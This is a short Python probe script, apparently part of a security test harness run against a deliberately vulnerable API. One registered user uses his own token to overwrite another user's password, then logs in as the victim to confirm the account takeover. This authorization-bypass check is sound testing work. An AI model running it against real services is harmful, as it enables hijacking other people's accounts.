from _probe_lib import call, jbody, register_and_login, run, uniq, verdict
def main() -> int:
    call("GET", "/createdb")
    alice, _ = register_and_login(uniq("alice"))
    bob, tb = register_and_login(uniq("bob"))
    new_pw = "hacked-123"
    status, body = call(
        "PUT", f"/users/v1/{alice}/password", {"password": new_pw}, token=tb
    )
    if status not in (200, 201, 204):  
        return verdict("pwchange(unauthorized update)", False)
    
    status, body = call("POST", "/users/v1/login", {"username": alice, "password": new_pw})
    changed = status == 200 and jbody(body).get("auth_token")
    return verdict("pwchange(unauthorized update)", bool(changed))

if __name__ == "__main__":
    run(main)
